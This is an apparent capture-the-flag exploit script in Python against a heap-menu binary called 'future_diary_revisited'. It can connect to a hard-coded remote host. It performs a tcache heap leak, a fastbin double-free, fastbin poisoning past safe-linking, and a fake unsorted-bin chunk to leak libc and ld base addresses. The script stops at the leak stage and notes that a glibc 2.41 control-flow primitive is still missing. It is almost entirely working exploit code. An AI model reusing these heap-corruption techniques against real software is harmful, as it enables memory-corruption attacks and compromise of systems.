#!/usr/bin/env python3
import subprocess, os, time, select, struct, sys

BIN = "./future_diary_revisited"
LD = "./ld-linux-x86-64.so.2"

HOST = "74.113.234.79"
PORT = 2222

def p64(x):
    return struct.pack("<Q", x)

def u64(b):
    return struct.unpack("<Q", b.ljust(8, b"\0"))[0]

class IO:
    def __init__(self, remote=False):
        self.remote = remote
        if remote:
            import socket
            self.s = socket.create_connection((HOST, PORT))
            self.p = None
        else:
            self.p = subprocess.Popen(
                [LD, "--library-path", ".", BIN],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            self.s = None

    def recv(self, timeout=0.05):
        if self.remote:
            self.s.settimeout(timeout)
            try:
                return self.s.recv(4096)
            except Exception:
                return b""
        r, _, _ = select.select([self.p.stdout], [], [], timeout)
        if r:
            return os.read(self.p.stdout.fileno(), 4096)
        return b""

    def read_until(self, marks, timeout=2):
        if isinstance(marks, bytes):
            marks = [marks]
        data = b""
        end = time.time() + timeout
        while time.time() < end:
            if any(m in data for m in marks):
                break
            b = self.recv(0.02)
            if not b:
                if self.p and self.p.poll() is not None:
                    break
                continue
            data += b
        return data

    def send(self, d):
        if self.remote:
            self.s.sendall(d)
        else:
            self.p.stdin.write(d)
            self.p.stdin.flush()

    def line(self, x):
        if isinstance(x, int):
            x = str(x).encode()
        elif isinstance(x, str):
            x = x.encode()
        self.send(x + b"\n")

    def create(self, idx, size, content=b""):
        assert len(content) == size
        self.line(1)
        self.read_until(b"page? ")
        self.line(idx)
        self.read_until(b"length? ")
        self.line(size)
        d = self.read_until([b"content? ", b"> "], timeout=1)
        if b"content? " in d:
            self.send(content)
            d += self.read_until(b"> ", timeout=1)
        return d

    def delete(self, idx):
        self.line(2)
        self.read_until(b"page? ")
        self.line(idx)
        return self.read_until(b"> ", timeout=1)

    def dump(self, idx):
        self.line(3)
        self.read_until(b"page? ")
        self.line(idx)
        data = self.read_until(b"1. create", timeout=1)
        if b"\n1. create" in data:
            return data.split(b"\n1. create")[0]
        return data

def leak_heap_libc(io):
    io.read_until(b"> ")

    # heap leak from freed tcache chunk
    io.create(1, 0x78, b"A" * 0x78)
    io.delete(1)
    heap_enc = u64(io.dump(1))
    heap = (heap_enc << 12) + 0x2a0

    # craft fake size before target region
    target = heap + 0x60
    p = bytearray(b"P" * 0x78)
    p[0x58:0x60] = p64(0x81)
    io.create(2, 0x78, bytes(p))

    # allocate adjacent chunks
    for i in range(3, 13):
        io.create(i, 0x78, bytes([i]) * 0x78)

    # fill tcache
    for i in range(4, 11):
        io.delete(i)

    # fastbin dup
    io.delete(11)
    io.delete(12)
    io.delete(11)

    # drain tcache
    for i in range(13, 20):
        io.create(i, 0x78, b"D" * 0x78)

    # poison fastbin to heap+0x60
    A = heap + 0x80 * (11 - 2)
    io.create(20, 0x78, p64(target ^ (A >> 12)) + b"E" * 0x70)
    io.create(21, 0x78, b"F" * 0x78)
    io.create(22, 0x78, b"G" * 0x78)

    # overwrite chunk 3 header to become fake large chunk
    fake = b"J" * 0x10
    fake += p64(0)
    fake += p64(0x481)
    fake += b"H" * (0x78 - len(fake))
    io.create(23, 0x78, fake)

    # free large fake chunk into unsorted bin
    io.delete(3)

    leak = u64(io.dump(3))
    libc = leak - 0x211b20
    ld = heap - 0x3e2a0

    print("[+] heap =", hex(heap))
    print("[+] libc leak =", hex(leak))
    print("[+] libc base =", hex(libc))
    print("[+] ld base =", hex(ld))

    return heap, libc, ld

def main():
    remote = len(sys.argv) > 1 and sys.argv[1] == "REMOTE"
    io = IO(remote=remote)

    heap, libc, ld = leak_heap_libc(io)

    print("[!] Leak stage done.")
    print("[!] Need final control-flow primitive for glibc 2.41.")
    print("[!] __free_hook path is invalid on this libc.")

if __name__ == "__main__":
    main()
